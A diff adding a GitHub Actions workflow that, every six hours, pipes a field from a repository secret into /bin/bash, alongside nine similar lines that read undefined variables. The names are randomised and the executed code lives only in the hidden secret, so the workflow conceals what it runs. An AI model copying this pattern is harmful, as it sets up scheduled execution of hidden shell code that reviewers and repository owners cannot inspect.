@@ -1,0 +1,26 @@
+name: shuzhigufeng
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shuzhigufeng
+        env:
+          na88: ${{ secrets.na88 }}
+        run: |
+          echo $na88 | jq -r .exahv6 | /bin/bash
+          echo $vnfrn024 | jq -r .gdunw94297 | /bin/bash
+          echo $u918 | jq -r .blc7 | /bin/bash
+          echo $a00 | jq -r .lfvjk64004 | /bin/bash
+          echo $i34653 | jq -r .vngc5425 | /bin/bash
+          echo $ti3670 | jq -r .lhja7721 | /bin/bash
+          echo $a05303 | jq -r .tme20 | /bin/bash
+          echo $eowx38 | jq -r .gakge67 | /bin/bash
+          echo $ezt40209 | jq -r .qv78049 | /bin/bash
+          echo $nmq23 | jq -r .bsi25 | /bin/bash
+
